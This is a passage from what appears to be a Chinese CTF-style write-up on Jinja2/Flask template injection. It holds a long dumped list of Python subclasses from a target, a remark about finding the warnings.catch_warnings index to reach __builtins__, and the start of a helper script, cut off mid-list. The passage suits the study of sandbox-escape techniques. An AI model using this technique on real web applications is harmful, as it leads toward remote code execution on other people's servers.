&#x27;int&#x27;&gt;, &lt;class &#x27;itsdangerous._json._CompactJSON&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Context&#x27;&gt;, &lt;class &#x27;argparse._AttributeHolder&#x27;&gt;, &lt;class &#x27;_pickle.Pdata&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;_ssl.MemoryBIO&#x27;&gt;, &lt;class &#x27;click._compat._AtomicFile&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.ClosingIterator&#x27;&gt;, &lt;class &#x27;os._DummyDirEntry&#x27;&gt;, &lt;class &#x27;selectors.BaseSelector&#x27;&gt;, &lt;class &#x27;subprocess.Popen&#x27;&gt;, &lt;class &#x27;markupsafe._MarkupEscapeHelper&#x27;&gt;, &lt;class &#x27;_pickle.PicklerMemoProxy&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinBytes&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;flask.signals.Namespace&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;itertools.cycle&#x27;&gt;, &lt;class &#x27;click.utils.LazyFile&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;itertools.compress&#x27;&gt;, &lt;class &#x27;threading.Condition&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;jinja2.idtracking.Symbols&#x27;&gt;, &lt;class &#x27;decimal.Decimal&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;operator.attrgetter&#x27;&gt;, &lt;class &#x27;string.Template&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;tempfile._RandomNameSequence&#x27;&gt;, &lt;class &#x27;json.decoder.JSONDecoder&#x27;&gt;, &lt;class &#x27;click._compat._FixupStream&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalManager&#x27;&gt;, &lt;class &#x27;threading.Semaphore&#x27;&gt;, &lt;class &#x27;itertools.combinations&#x27;&gt;, &lt;class &#x27;_socket.socket&#x27;&gt;, &lt;class &#x27;logging.Filter&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ContentRange&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;tarfile._LowLevelFile&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;jinja2.utils.LRUCache&#x27;&gt;, &lt;class &#x27;itertools.repeat&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinStr&#x27;&gt;, &lt;class &#x27;ctypes.LibraryLoader&#x27;&gt;, &lt;class &#x27;socketserver.BaseServer&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;socketserver.ForkingMixIn&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV4&#x27;&gt;, &lt;class &#x27;argparse.HelpFormatter._Section&#x27;&gt;, &lt;class &#x27;email.parser.Parser&#x27;&gt;, &lt;class &#x27;_json.Scanner&#x27;&gt;, &lt;class &#x27;itertools._grouper&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;traceback.FrameSummary&#x27;&gt;, &lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;class &#x27;jinja2.runtime.LoopContext&#x27;&gt;, &lt;class &#x27;werkzeug.routing.RuleFactory&#x27;&gt;, &lt;class &#x27;_ssl._SSLSocket&#x27;&gt;, &lt;class &#x27;email._parseaddr.AddrlistClass&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;tempfile.TemporaryDirectory&#x27;&gt;, &lt;class &#x27;sre_parse.SubPattern&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;_collections._deque_iterator&#x27;&gt;, &lt;class &#x27;_pickle.Unpickler&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileCloser&#x27;&gt;, &lt;class &#x27;click.utils.KeepOpenFile&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;contextlib._RedirectStream&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;jinja2.compiler.MacroRef&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;jinja2.nodes.EvalContext&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;hmac.HMAC&#x27;&gt;, &lt;class &#x27;itertools._tee&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;operator.methodcaller&#x27;&gt;, &lt;class &#x27;urllib.request.OpenerDirector&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;&gt;, &lt;class &#x27;socketserver.BaseRequestHandler&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Lexer&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;werkzeug._internal._DictAccessorProperty&#x27;&gt;, &lt;class &#x27;flask.ctx.RequestContext&#x27;&gt;, &lt;class &#x27;jinja2.environment.Template&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.cors.CORSRequestMixin&#x27;&gt;, &lt;class &#x27;click.parser.ParsingState&#x27;&gt;, &lt;class &#x27;itertools.product&#x27;&gt;, &lt;class &#x27;flask.helpers._PackageBoundObject&#x27;&gt;, &lt;class &#x27;logging.BufferingFormatter&#x27;&gt;, &lt;class &#x27;werkzeug.utils.HTMLBuilder&#x27;&gt;, &lt;class &#x27;difflib.HtmlDiff&#x27;&gt;, &lt;class &#x27;gettext.NullTranslations&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;&gt;, &lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;email.header._ValueFormatter&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;jinja2.nodes.Node&#x27;&gt;, &lt;class &#x27;argparse.FileType&#x27;&gt;, &lt;class &#x27;pkgutil.ImpImporter&#x27;&gt;, &lt;class &#x27;itertools.count&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;email.feedparser.BufferedSubFile&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.FileWrapper&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;&gt;, &lt;class &#x27;_json.Encoder&#x27;&gt;, &lt;class &#x27;tarfile._StreamProxy&#x27;&gt;, &lt;class &#x27;jinja2.parser.Parser&#x27;&gt;, &lt;class &#x27;string.Formatter&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.json.JSONMixin&#x27;&gt;, &lt;class &#x27;jinja2.utils.Namespace&#x27;&gt;, &lt;class &#x27;werkzeug.test._TestCookieHeaders&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;_ssl._SSLContext&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;click.core.Parameter&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV6&#x27;&gt;, &lt;class &#x27;tarfile.TarFile&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;jinja2.bccache.BytecodeCache&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;&gt;, &lt;class &#x27;Struct&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;http.cookiejar.Cookie&#x27;&gt;, &lt;class &#x27;pathlib._TerminatingSelector&#x27;&gt;, &lt;class &#x27;_pickle.Pickler&#x27;&gt;, &lt;class &#x27;copy._EmptyClass&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;itsdangerous.serializer.Serializer&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.Range&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;datetime.time&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;sre_parse.Tokenizer&#x27;&gt;, &lt;class &#x27;itertools._tee_dataobject&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;threading._RLock&#x27;&gt;, &lt;class &#x27;logging.Manager&#x27;&gt;, &lt;class &#x27;werkzeug.routing.Map&#x27;&gt;, &lt;class &#x27;inspect._void&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateExpression&#x27;&gt;, &lt;class &#x27;urllib.request.HTTPPasswordMgr&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;werkzeug.routing.MapAdapter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;logging.PercentStyle&#x27;&gt;, &lt;class &#x27;jinja2.runtime.TemplateReference&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.UpdateDictMixin&#x27;&gt;, &lt;class &#x27;itertools.chain&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.FileStorage&#x27;&gt;, &lt;class &#x27;itertools.filterfalse&#x27;&gt;, &lt;class &#x27;flask.helpers.locked_cached_property&#x27;&gt;, &lt;class &#x27;flask.cli.DispatchingApp&#x27;&gt;, &lt;class &#x27;tarfile._FileInFile&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalStack&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;pprint._safe_key&#x27;&gt;, &lt;class &#x27;tokenize.Untokenizer&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.FormDataParser&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;].</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>拿脚本来找到<code>warnings.catch_warnings</code>子类的下标</p>
+<p>来利用他的子类<code>__builtins__</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">classes=&quot;&quot;&quot;</span><br><span class="line">[&lt;class &#x27;_bz2.BZ2Decompressor&#x27;&gt;, &lt;class &#x27;_collections._deque_iterator&#x27;&gt;, &lt;class &#x27;_frozen_importlib._installed_safely&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;_json.Encoder&#x27;&gt;, &lt;class &#x27;tempfile.TemporaryDirectory&#x27;&gt;, &lt;class &#x27;hmac.HMAC&#x27;&gt;, &lt;class &#x27;urllib.request.OpenerDirector&#x27;&gt;, &lt;class &#x27;werkzeug.test.EnvironBuilder&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;&gt;, &lt;class &#x27;collections.deque&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ManageReload&#x27;&gt;, &lt;class &#x27;subprocess.Popen&#x27;&gt;, &lt;class &#x27;click.core.BaseCommand&#x27;&gt;, &lt;class &#x27;functools.partial&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;&gt;, &lt;class &#x27;_pickle.Pickler&#x27;&gt;, &lt;class &#x27;numbers.Number&#x27;&gt;, &lt;class &#x27;click.parser.ParsingState&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;datetime.time&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV6&#x27;&gt;, &lt;class &#x27;sre_parse.SubPattern&#x27;&gt;, &lt;class &#x27;itertools.groupby&#x27;&gt;, &lt;class &#x27;operator.attrgetter&#x27;&gt;, &lt;class &#x27;string.Formatter&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalStack&#x27;&gt;, &lt;class &#x27;logging.Formatter&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;&gt;, &lt;class &#x27;flask.blueprints.BlueprintSetupState&#x27;&gt;, &lt;class &#x27;email.parser.Parser&#x27;&gt;, &lt;class &#x27;tokenize.Untokenizer&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;itertools.count&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;itertools.chain&#x27;&gt;, &lt;class &#x27;jinja2.environment.Template&#x27;&gt;, &lt;class &#x27;contextlib.suppress&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;inspect._empty&#x27;&gt;, &lt;class &#x27;ctypes.LibraryLoader&#x27;&gt;, &lt;class &#x27;uuid.UUID&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;itertools._tee_dataobject&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;click.parser.OptionParser&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;flask.json.tag.JSONTag&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Context&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;email.parser.BytesParser&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.cors.CORSResponseMixin&#x27;&gt;, &lt;class &#x27;_json.Scanner&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;&gt;, &lt;class &#x27;werkzeug.utils.HTMLBuilder&#x27;&gt;, &lt;class &#x27;werkzeug.routing.BaseConverter&#x27;&gt;, &lt;class &#x27;inspect._void&#x27;&gt;, &lt;class &#x27;inspect.BlockFinder&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;jinja2.visitor.NodeVisitor&#x27;&gt;, &lt;class &#x27;itsdangerous.serializer.Serializer&#x27;&gt;, &lt;class &#x27;Struct&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateStream&#x27;&gt;, &lt;class &#x27;click.core.Context&#x27;&gt;, &lt;class &#x27;flask.cli.ScriptInfo&#x27;&gt;, &lt;class &#x27;CArgObject&#x27;&gt;, &lt;class &#x27;email.header.Header&#x27;&gt;, &lt;class &#x27;flask.ctx._AppCtxGlobals&#x27;&gt;, &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;, &lt;class &#x27;itertools._grouper&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;operator.itemgetter&#x27;&gt;, &lt;class &#x27;sre_parse.Pattern&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;werkzeug.test._TestCookieResponse&#x27;&gt;, &lt;class &#x27;click.types.ParamType&#x27;&gt;, &lt;class &#x27;zlib.Compress&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.response.ResponseStream&#x27;&gt;, &lt;class &#x27;textwrap.TextWrapper&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;socketserver.ForkingMixIn&#x27;&gt;, &lt;class &#x27;types._GeneratorWrapper&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;pprint.PrettyPrinter&#x27;&gt;, &lt;class &#x27;calendar._localized_day&#x27;&gt;, &lt;class &#x27;socketserver.BaseRequestHandler&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.Signer&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;_ssl.MemoryBIO&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;selectors.BaseSelector&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ViewItems&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileCloser&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;contextlib.ContextDecorator&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Macro&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;email.message.Message&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStream&#x27;&gt;, &lt;class &#x27;click.parser.Argument&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;flask.json.tag.TaggedJSONSerializer&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;copy._EmptyClass&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;argparse._AttributeHolder&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;tarfile._Stream&#x27;&gt;, &lt;class &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;threading.Event&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.Range&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;_lzma.LZMACompressor&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;threading.Barrier&#x27;&gt;, &lt;class &#x27;click.utils.LazyFile&#x27;&gt;, &lt;class &#x27;_pickle.Unpickler&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;pkgutil.ImpLoader&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;ipaddress._IPv6Constants&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;pathlib._Selector&#x27;&gt;, &lt;class &#x27;werkzeug._internal._DictAccessorProperty&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;tarfile.TarIter&#x27;&gt;, &lt;class &#x27;_ctypes._CData&#x27;&gt;, &lt;class &#x27;click.parser.Option&#x27;&gt;, &lt;class &#x27;inspect.BoundArguments&#x27;&gt;, &lt;class &#x27;calendar.different_locale&#x27;&gt;, &lt;class &#x27;jinja2.ext._CommentFinder&#x27;&gt;, &lt;class &#x27;email.header._ValueFormatter&#x27;&gt;, &lt;class &#x27;click.formatting.HelpFormatter&#x27;&gt;, &lt;class &#x27;ssl.SSLObject&#x27;&gt;, &lt;class &#x27;threading.Thread&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.base_response.BaseResponse&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;itertools.permutations&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;argparse.HelpFormatter&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.SigningAlgorithm&#x27;&gt;, &lt;class &#x27;itertools.islice&#x27;&gt;, &lt;class &#x27;threading._RLock&#x27;&gt;, &lt;class &#x27;logging.Filter&#x27;&gt;, &lt;class &#x27;_ast.AST&#x27;&gt;, &lt;class &#x27;calendar._localized_month&#x27;&gt;, &lt;class &#x27;urllib.request.Request&#x27;&gt;, &lt;class &#x27;jinja2.environment.Environment&#x27;&gt;, &lt;class &#x27;email._policybase._PolicyBase&#x27;&gt;, &lt;class &#x27;decimal.SignalDictMixin&#x27;&gt;, &lt;class &#x27;jinja2.bccache.BytecodeCache&#x27;&gt;, &lt;class &#x27;email._parseaddr.AddrlistClass&#x27;&gt;, &lt;class &#x27;jinja2.utils.LRUCache&#x27;&gt;, &lt;class &#x27;argparse.HelpFormatter._Section&#x27;&gt;, &lt;class &#x27;traceback.FrameSummary&#x27;&gt;, &lt;class &#x27;posix.ScandirIterator&#x27;&gt;, &lt;class &#x27;itertools.accumulate&#x27;&gt;, &lt;class &#x27;email.feedparser.FeedParser&#x27;&gt;, &lt;class &#x27;urllib.request.BaseHandler&#x27;&gt;, &lt;class &#x27;logging.LoggerAdapter&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;flask.signals.Namespace&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;http.client.HTTPConnection&#x27;&gt;, &lt;class &#x27;reprlib.Repr&#x27;&gt;, &lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;, &lt;class &#x27;difflib.HtmlDiff&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;werkzeug.useragents.UserAgentParser&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;ast.NodeVisitor&#x27;&gt;, &lt;class &#x27;_ctypes.DictRemover&#x27;&gt;, &lt;class &#x27;contextlib.closing&#x27;&gt;, &lt;class &#x27;calendar.Calendar&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;_sre.SRE_Match&#x27;&gt;, &lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;class &#x27;unicodedata.UCD&#x27;&gt;, &lt;class &#x27;jinja2.compiler.MacroRef&#x27;&gt;, &lt;class &#x27;werkzeug.test.Client&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;threading.Semaphore&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookieJar&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;jinja2.bccache.Bucket&#x27;&gt;, &lt;class &#x27;click._compat._FixupStream&#x27;&gt;, &lt;class &#x27;select.poll&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookiePolicy&#x27;&gt;, &lt;class &#x27;datetime.date&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;tarfile._FileInFile&#x27;&gt;, &lt;class &#x27;jinja2.utils.Cycler&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;email.charset.Charset&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV4&#x27;&gt;, &lt;class &#x27;zlib.Decompress&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;flask.cli.DispatchingApp&#x27;&gt;, &lt;class &#x27;weakref.finalize._Info&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;&gt;, &lt;enum &#x27;Enum&#x27;&gt;, &lt;class &#x27;os._DummyDirEntry&#x27;&gt;, &lt;class &#x27;tempfile.SpooledTemporaryFile&#x27;&gt;, &lt;class &#x27;itertools.takewhile&#x27;&gt;, &lt;class &#x27;sre_parse.Tokenizer&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.MapAdapter&#x27;&gt;, &lt;class &#x27;importlib.abc.Loader&#x27;&gt;, &lt;class &#x27;difflib.Differ&#x27;&gt;, &lt;class &#x27;jinja2.runtime.BlockReference&#x27;&gt;, &lt;class &#x27;werkzeug.routing.Map&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;jinja2.utils.Namespace&#x27;&gt;, &lt;class &#x27;jinja2.nodes.Node&#x27;&gt;, &lt;class &#x27;http.cookiejar.Absent&#x27;&gt;, &lt;class &#x27;jinja2.ext.Extension&#x27;&gt;, &lt;class &#x27;json.decoder.JSONDecoder&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;itertools.filterfalse&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;werkzeug.routing.RuleFactory&#x27;&gt;, &lt;class &#x27;email.feedparser.BufferedSubFile&#x27;&gt;, &lt;class &#x27;logging.Manager&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;_sre.SRE_Pattern&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.IfRange&#x27;&gt;, &lt;class &#x27;re.Scanner&#x27;&gt;, &lt;class &#x27;tempfile._RandomNameSequence&#x27;&gt;, &lt;class &#x27;flask.ctx.RequestContext&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;flask.ctx.AppContext&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.FileWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.ClosingIterator&#x27;&gt;, &lt;class &#x27;select.epoll&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractDigestAuthHandler&#x27;&gt;, &lt;class &#x27;logging.PlaceHolder&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;jinja2.compiler.Frame&#x27;&gt;, &lt;class &#x27;jinja2.idtracking.Symbols&#x27;&gt;, &lt;class &#x27;mimetypes.MimeTypes&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.FileStorage&#x27;&gt;, &lt;class &#x27;_pickle.UnpicklerMemoProxy&#x27;&gt;, &lt;class &#x27;logging.PercentStyle&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Compressor&#x27;&gt;, &lt;class &#x27;gettext.NullTranslations&#x27;&gt;, &lt;class &#x27;jinja2.loaders.BaseLoader&#x27;&gt;, &lt;class &#x27;_ctypes.CField&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractBasicAuthHandler&#x27;&gt;, &lt;class &#x27;itertools.dropwhile&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.FormDataParser&#x27;&gt;, &lt;class &#x27;click._compat._AtomicFile&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;werkzeug.useragents.UserAgent&#x27;&gt;, &lt;class &#x27;decimal.Context&#x27;&gt;, &lt;class 